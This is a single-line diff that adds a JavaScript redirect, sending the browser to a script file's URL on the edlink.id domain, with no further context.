@@ -1,0 +1,1 @@
+window.location.replace("https://edlink.id/app/a44b9ce.js");
